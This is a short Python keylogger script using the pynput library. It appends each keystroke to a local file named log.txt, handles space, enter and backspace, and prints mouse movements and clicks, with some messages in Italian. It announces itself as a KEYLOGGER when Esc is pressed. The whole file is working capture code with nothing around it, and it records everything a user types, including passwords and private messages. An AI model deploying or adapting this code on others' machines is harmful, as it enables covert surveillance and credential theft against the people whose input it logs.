from pynput import keyboard, mouse
from pynput.keyboard import Key

keyboard_keys = {getattr(keyboard.Key, attr) for attr in dir(keyboard.Key) if not callable(getattr(keyboard.Key, attr)) and not attr.startswith("__")}

def write_on_file(s_key):
    print(s_key)
    with open('log.txt', 'a+') as file_output:
        if s_key == 'Key.space':
            file_output.write(' ')
        elif s_key == 'Key.enter':
            file_output.write('\n')
        elif s_key == 'Key.backspace':
            # Delete the last character in the file
            file_output.seek(0, 2)  # Move the cursor to the end of the file
            pos = file_output.tell()
            if pos > 0:
                file_output.truncate(pos - 1)  # Delete the last character
        elif s_key.startswith('Key.'):
            pass
        else:
            file_output.write(s_key[1:-1])

def on_press(key):
    s_key = str(key)
    write_on_file(s_key)

def on_release(key):
    if key == keyboard.Key.esc:
        print('Exiting the KEYLOGGER...')
        return False
    
def on_move(x, y):
    x = str(x)
    y = str(y)

    s_cordinate = f'mouse mosso alle coordinate: x={x}, y={y}'
    print(s_cordinate)

def on_click(x, y, tasto, premuto):
    if premuto:
        print(f'click del mouse rilevato, tasto: {tasto}')

# Run keyboard listener in a separate thread
keyboard_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
keyboard_listener.start()

# Run mouse listener in the main thread
mouse_listener = mouse.Listener(on_move=on_move, on_click=on_click)
mouse_listener.run()
